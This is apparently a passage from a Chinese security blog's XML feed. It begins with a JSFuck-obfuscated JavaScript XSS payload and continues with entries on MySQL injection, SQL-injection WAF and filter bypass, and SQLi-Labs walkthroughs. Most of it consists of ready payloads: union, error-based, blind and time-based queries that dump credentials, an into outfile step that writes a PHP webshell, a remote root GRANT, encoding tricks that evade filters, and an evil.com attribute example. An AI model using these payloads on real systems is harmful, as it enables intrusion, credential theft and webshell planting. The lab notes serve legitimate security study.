(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])() &lt;/script&gt; `]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>XSS</tag>
        <tag>WAF绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql注入总结]]></title>
    <url>%2F2016%2F08%2F02%2FMysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[mysql一般注入(select)，mysql一般注入(insert、update)，mysql报错注入，mysql一般盲注，mysql时间盲注，mysql的一些特性在SQL注入中的利用。 0x00 mysql一般注入(select)1.注释符:#,/*,-- 2.过滤空格注入使用/**/或()或+代替空格 %0c = form feed, new page %09 = horizontal tab %0d = carriage return %0a = line feed, new line 3.多条数据显示 concat() group_concat() concat_ws() 4.相关函数 system_user() 系统用户名 user() 用户名 current_user 当前用户名 session_user()连接数据库的用户名 database() 数据库名 version() MYSQL数据库版本 load_file() MYSQL读取本地文件的函数 @@datadir 读取数据库路径 @@basedir MYSQL 安装路径 @@version_compile_os 操作系统 GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION; 5.mysql一般注入语句 猜字段数 order by n# 查看mysql基本信息 and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7# 查询数据库 and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1# and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata# 查询表名 and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库的16进制编码 limit 1,1# and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库的16进制编码# 查询字段 and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码 limit 1,1# and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码# 查询数据 and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表# 判断是否具有读写权限 and (select count(*) from mysql.user)&gt;0# 读权限 and (select count(file_priv) from mysql.user)&gt;0# 写权限 6.mysql读取写入文件 必备条件： 读：file权限必备 写：1.绝对路径 2.union使用 3. 可以使用&apos;&apos; ————————-读———————- mysql3.x读取方法 create table a(命令 文本名); load data infile &apos;c:\\xxx\\xxx\\xxx.txt&apos; into table a; select * from a; mysql4.x读取方法 除上述方法还可以使用load_file() create table a(命令 文本名); insert into a(命令) values(load_file(&apos;c:\\ddd\\ddd\\ddd.txt&apos;)); select * from a; mysql5.x读取方法 上述两种都可以 读取文件技巧： load_file(char(32,26,56,66)) load_file(0x633A5C626F6F742E696E69) c:\boot.ini ————————-写———————- into outfile写文件 union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile &apos;d:\web\90team.php&apos;# union select 1,2,3,load_file(&apos;d:\web\logo123.jpg&apos;),5,6,7,8,9,10,7 into outfile &apos;d:\web\90team.php&apos;# 0x01 mysql一般注入(insert、update)一般情况同上 mysql一般请求mysql_query不支持多语句执行，mysqli可以。 insert注入多使用报错注入! 1.如果可以直接插入管理员可以直接使用! insert into user(username,password) values(&apos;xxxx&apos;,&apos; xxxx&apos;),(&apos;dddd&apos;,&apos;dddd&apos;)/* &apos;); 2.如果可以插入一些数据，这些数据会在网页中显示，我们可以结合xxs和csrf来获取cookies或getshell update注入同上 0x02 mysql报错注入1、通过floor暴错FLOOR(x)函数用于返回小于或等于x的最大整数值。 通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor (random(0)*2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一 行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。 group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行，不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。 具体原理参考：http://www.mysqlops.com/2012/05/15/mysql-sql-analyze.html）。 常用语句： 数据库版本 ?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 简单办法爆库 ?id=info() 爆用户 ?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 爆数据库名 ?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 爆库 ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 爆表 ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 爆字段 ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 爆内容 ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 注：使用group by报错注入方式的注意事项 (1)报错语句中的count(*)不可缺少。 (2)from 表也不可缺少。 2、ExtractValue(有长度限制,最长32位)ExtractValue()函数是对XML文档进行查询和修改的函数。 extractvalue()函数有两个参数，在实际注入时第一个参数设为1，第二个参数就是需要爆的数据。 如：extractvalue(1, concat(0x5c,version()))。 同样，在使用中会遇到如下面UpdateXml()类似的相同问题，即如果在爆的数据前不连接其他字符可能会显示不完全。即获取版本号时，第二个参数不能为version(),而应改为concat(0x5c,version()) 常用语句： ?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e)) ?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1))) 3、UpdateXml(有长度限制,最长32位)UpdateXml()函数也是是对XML文档进行查询和修改的函数。 UpdateXml()函数有三个参数，在实际渗透时第一个和第三个参数直接写1即可，第二个参数就是需要爆出的内容，要爆出不同的内容直接修改第二个参数即可。但是在实际使用时注意一个问题：即爆错的内容可能显示不完整。 常用语句： ?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) ?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1) 4、NAME_CONST(适用于低版本)?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)-- 不好用 5、Error based Double Query Injection数据库版本 ?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1 0x03 mysql一般盲注使用ascii AND ascii(substring((SELECT password FROM users where id=1),1,1))=49 使用正则表达式 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &apos;^[a-n]&apos; LIMIT 0,1) 盲注没什么说的，就是利用是否等于，这些函数判断ascii码，脚本跑呗，或者sqlmap 0x04 mysql时间盲注时间盲注用两个函数一个是sleep,一个是benchmark，sleep就不说了。 benchmark语法： BENCHMARK(count,expr) BENCHMARK()函数重复countTimes次执行表达式expr 常用语句： union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(&apos;msg&apos;,&apos;by 5 seconds&apos;)),null) from (select database() as current) as tbl UNION SELECT IF(SUBSTRING(Password,1,1)=&apos;a&apos;,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = &apos;root&apos; 0x05 mysql的一些特性在SQL注入中的利用1、大小写利用不管你表单填写的是什么，插入到mysql数据库的时候，都会变成小写。 如：注册admin时显示用户已存在，你可以尝试ADMIN注册。 2、字符截断利用mysql在使用utf8的时候，一个字符的大小的上限为3字节，而当出现四个字节的字符时，是需要用使用utf8mb4编码，不使用的话，会将不识别的四字节的字符连同后面的字符串一同舍弃。 所以只要我们使用ascii&gt;=256的特殊字符就可以绕过了。 如： UPDATE `wp_comments` SET `comment_content` = &apos;admin特殊字符123456 &apos; WHERE `wp_comments`.`comment_ID` =12; 以上语句插入到数据库的内容就是admin了，后面的123456被特殊字符截断。 3、超过长度截断利用就是利用数据定义时，定义的长度大小截断。 如： insert into user values (&apos;admin++++++++++++++++123456&apos;,&apos;123456&apos;); 以上语句，如果长度限制是16位，那么插入到数据库中的时候用户名的123456被截断 用户：admin 密码：123456]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>MySQL</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入绕过技巧]]></title>
    <url>%2F2016%2F08%2F01%2FSQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[SQL注入攻击是黑客对数据库进行攻击的常用手段之一。由于程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。 0x00 sql注入的原因sql注入的原因，表面上说是因为 拼接字符串，构成sql语句，没有使用 sql语句预编译，绑定变量。 但是更深层次的原因是，将用户输入的字符串，当成了 “sql语句” 来执行。 比如上面的 String sql = “select id,no from user where id=” + id;我们希望用户输入的 id 的值，仅仅作为一个字符串字面值，传入数据库执行，但是当输入了： 2 or 1=1 时，其中的 or 1=1 并没有作为 where id= 的字面值，而是作为了 sql语句 来执行的。所以其本质是将用户的输入的数据，作为了命令来执行。 0x01 sql注入绕过1.1 注释符绕过常用注释符： //, -- , /**/, #, --+, -- -, ;,%00,--a UNION /**/ Select /**/user，pwd，from user U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user 1.2 大小写绕过?id=1+UnIoN/**/SeLeCT 1.3 内联注释绕过id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- - 通常情况下，上面的代码可以绕过过滤器，请注意，我们用的是 Like而不是 = 1.4 双关键字绕过?id=1+UNIunionON+SeLselectECT+1,2,3– 1.5 编码绕过如URLEncode编码，ASCII,HEX,unicode编码绕过 or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。 十六进制编码 SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) 双重编码绕过 ?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+ 一些unicode编码举例： 单引号：&apos; %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7 空白： %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0 左括号(: %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8 右括号): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9 1.6 空格绕过两个空格代替一个空格，用Tab代替空格 %20 %09 %0a %0b %0c %0d %a0 /**/ 括号绕过空格 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来 select(user())from dual where 1=1 and 2=2; 1.7 万能密钥绕过用经典的or 1=1判断绕过,如or ‘swords’ =’swords 1.8 +,-,.号拆解字符串绕过?id=1&apos; or &apos;11+11&apos;=&apos;11+11&apos; &quot;-&quot;和&quot;.&quot; 1.9 like绕过?id=1&apos; or 1 like 1 绕过对“=”，“&gt;”等的过滤 2.0 in绕过or &apos;1&apos; IN (&apos;swords&apos;) 2.1 &gt;,&lt;绕过or &apos;password&apos; &gt; &apos;pass&apos; or 1&lt;3 2.2 等价函数与命令绕过1.函数或变量 hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者： substr((select &apos;password&apos;),1,1) = 0x70 strcmp(left(&apos;password&apos;,1), 0x69) = 1 strcmp(left(&apos;password&apos;,1), 0x70) = 0 strcmp(left(&apos;password&apos;,1), 0x71) = -1 2.符号 and和or有可能不能使用，可以试下&amp;&amp;和|| =不能使用的情况，可以考虑尝试&lt;、&gt; 3.生僻函数 MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’); ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror)); //postgresql ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1)) and extractvalue(1, concat(0x5c, (select user()),0x5c)) 2.3 反引号`绕过select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用 2.4 换行符绕过%0a、%0d 2.5 截断绕过%00,%0A,?,/0,////////////////........////////,%80-%99 目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。 ././././././././././././././././abc ////////////////////////abc ..1/abc/../1/abc/../1/abc 2.6 宽字节绕过过滤单引号时，可以试试宽字节 %bf%27 %df%27 %aa%27 2.7 \N绕过\N其实相当于NULL字符 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0 2.8 特殊的绕过函数1. 通过greatest函数绕过不能使用大小于符号的情况 greatest(a,b)，返回a和b中较大的那个数。 当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用： mysql&gt; select greatest(ascii(mid(user(),1,1)),150)=150; +------------------------------------------+ | greatest(ascii(mid(user(),1,1)),150)=150 | +------------------------------------------+ | 1 | +------------------------------------------+ 如果小于150，则上述返回值为True。 2. 通过substr函数绕过不能使用逗号的情况 mid(user() from 1 for 1) 或 substr(user() from 1 for 1) mysql&gt; select ascii(substr(user() from 1 for 1)) &lt; 150; +------------------------------------------+ | ascii(substr(user() from 1 for 1)) &lt; 150 | +------------------------------------------+ | 1 | +------------------------------------------+ 3.使用数学运算函数在子查询中报错 exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。 ~x 是一个一元运算符，将x按位取补 select exp(~(select*from(select user())a)) mysql报错： mysql&gt; select exp(~(select*from(select user())a)); ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’ 这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是： (select*from(select user())a) 得到字符串 root@localhost 表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数 附：PHP中一些常见的过滤方法及绕过方式过滤关键字 and or php代码 preg_match(&apos;/(and|or)/i&apos;,$id) 会过滤的攻击代码 1 or 1=1 1 and 1=1 绕过方式 1 || 1=1 1 &amp;&amp; 1=1 过滤关键字 and or union php代码 preg_match(&apos;/(and|or|union)/i&apos;,$id) 会过滤的攻击代码 union select user,password from users 绕过方式 1 &amp;&amp; (select user from users where userid=1)=&apos;admin&apos; 过滤关键字 and or union where php代码 preg_match(&apos;/(and|or|union|where)/i&apos;,$id) 会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos; 绕过方式 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos; 过滤关键字 and or union where php代码 preg_match(&apos;/(and|or|union|where)/i&apos;,$id) 会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos; 绕过方式 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos; 过滤关键字 and, or, union, where, limit php代码 preg_match(&apos;/(and|or|union|where|limit)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos; 绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;#user_id聚合中user_id为1的user为admin 过滤关键字 and, or, union, where, limit, group by php代码 preg_match(&apos;/(and|or|union|where|limit|group by)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos; 绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1 过滤关键字 and, or, union, where, limit, group by, select php代码 preg_match(&apos;/(and|or|union|where|limit|group by|select)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1 绕过方式 1 &amp;&amp; substr(user,1,1) = &apos;a&apos; 过滤关键字 and, or, union, where, limit, group by, select, &apos; php代码 preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1 绕过方式 1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61) 过滤关键字 and, or, union, where, limit, group by, select, &apos;, hex php代码 preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = unhex(61) 绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。 过滤关键字 and, or, union, where, limit, group by, select, &apos;, hex, substr php代码 preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt; 绕过方式 1 &amp;&amp; lpad(user,7,1) 过滤关键字 and, or, union, where, limit, group by, select, &apos;, hex, substr, 空格 php代码 preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr|\s)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; lpad(user,7,1)/td&gt; 绕过方式 1%0b||%0blpad(user,7,1) 过滤关键字 and or union where php代码 preg_match(&apos;/(and|or|union|where)/i&apos;,$id) 会过滤的攻击代码 1 || (select user from users where user_id = 1) = &apos;admin&apos; 绕过方式 1 || (select user from users limit 1) = &apos;admin&apos;]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLi-Labs学习笔记]]></title>
    <url>%2F2016%2F07%2F29%2FSQL-Labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能让我们有能力通过结构化查询来管理大型数据库。 我们将要使用的实验室是SQLi Labs，它是一个可以从https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。 Less-1关键代码： $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 可以看到对于直接 GET 进来的文本没有过滤。同时，在查询语句中，id=’$id’，变量加了引号。这里引号的意思是把输入的 id 当做字符串来处理，取从头开始的最长数字且类型转换为整形进行查询。 ?id=12a 显示id为12的用户 ?id=1a2a 显示id为1的用户 ?id=102a 显示id为102的用户（不存在） 盲注 ?id=1%27and+left(version(),1)=5%23 得出数据库版本为5开头 ?id=1%27and+length(database())=8%23 数据库名长度为8 ?id=1%27and+left(database(),8)=&apos;security&apos;%23 数据库为security ?id=1%27and+length(username)=4%23 用户名长度为4 ?id=1%27and+left(username,4)=&apos;Dumb&apos;%23 用户名为Dumb ?id=1%27and+length(password)=4%23 密码长度为4 ?id=1%27and+left(password,4)=&apos;Dumb&apos;%23 密码为Dumb Less-2关键代码： $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”; 同样未做过滤，但此处的变量 id 无引号。大概是直接将变量 id 当做整形传入查询。 ?id=12 显示 id 为 12 的用户 ?id=12a 报错：Unknown column &apos;12a&apos; in &apos;where clause&apos; ?id=%31 显示 id 为 1 的用户 注入测试： ?id=1+and+left(version(),1)=5 直接注入即可得到版本号 Less-3关键代码： $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”; 未过滤，但变量 id 加了引号和括号。将变量 id 以字符串形式引入，和Less-1很像，但是却又多了个括号，猜测是防止注入语句。 注入测试： ?id=12+and+1=1 显示正确 ?id=12+an 不完全语句也显示正确 猜测：括号将变量限制在括号范围内，尝试手动提前匹配括号注入。 ?id=12%27 成功报错：&apos;&apos;12&apos;&apos;) LIMIT 0,1&apos; at line 1 ?id=1%27%29and+1=2%23 无显示，可注入 上面那条语句还原到 SQL 语句时，为： SELECT * FORM users WHERE id=(&apos;1&apos;)and 1=2#&apos;) LIMIT 0,1 将括号提前结束且用 #号注释掉接下来的语句。接下来的注入只要替换 and 1=1 语句就行了。 Less-4关键代码： $id = ‘“‘ . $id . ‘“‘; $sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”; 对变量 id 做了处理。该处理在 id 前后添加双引号。 ?id=1%22%29+and+1=2%23 无显示，可注入 SELECT * FROM users WHERE id=(&quot;1&quot;)and 1=2#&quot;) LIMIT 0,1 Less-5关键代码： $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; ?id=1&apos;and+1=2# Less-6关键代码： $id = ‘“‘.$id.’”‘; $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”; ?id=1&quot;and+1=2# Less-7关键代码： $sql=”SELECT * FROM users WHERE id=((‘$id’)) LIMIT 0,1”; ?id=1&apos;))and 1=2# Less-8关键代码： $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; ?id=1&apos; and 1=2# Less-9尝试了很多次，各种组合，但是服务器返回的结果都是一样。尝试 ?id=10000000000返回结果也是正确，因为不存在这么大的 id，所以判断这个页面把正确和错误的信息全部返回一致。于是，使用基于时间的注入，构造以下语句： ?id=1&apos; and sleep(5) %23 如果错误，则服务器处理5秒再返回，否则直接返回，找到正确的注入点。 ?id=1&apos; and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) %23 ?id=1&apos; and if(ascii(substr(database(),1,1))&gt;114, 0, sleep(5)) %23 第一个语句暂停五秒第二个直接返回，判断数据库名的第一个字母为s（ascii为115） Less-10又是一个基于时间的注入，尝试了下，注入点在这： ?id=1&quot; and sleep(5) %23 Less-11这个页面采用 POST 的方法得到数据。于是用 HackBar 修改 post 数据进行测试： uname=admin&amp;passwd=123&apos; 显示： &apos;&apos;123&apos;&apos; LIMIT 0,1&apos; 去掉单引号 &apos;123&apos;&apos; LIMIT 0,1 再去掉密码的单引号 123&apos; LIMIT 0,1 所以确定是单引号注入，直接万能密钥试试： uname=admin&apos; or &apos;1&apos;=&apos;1 &amp;passwd=123456 这里的话有个点： 如果输入：uname=admin’ or ‘1’=’1 &amp;passwd=123456，会显示失败，为什么呢？ 首先and的优先级高于or 【就是and先运算】 那么’1’=’1’ and password=’123456’先运算，因为users表里面的password字段没有一个数据时test，右边是false，那么整个表达式就是false 这个时候整个的语句就是： SELECT username, password FROM users WHERE username=&apos;test&apos; or false LIMIT 0,1 数据库里没有test用户，所以就失败了。 而万能密钥的语句是： SELECT username, password FROM users WHERE username=&apos;admin&apos; or false LIMIT 0,1 对于上述的情况，我们在密码字段加入即可 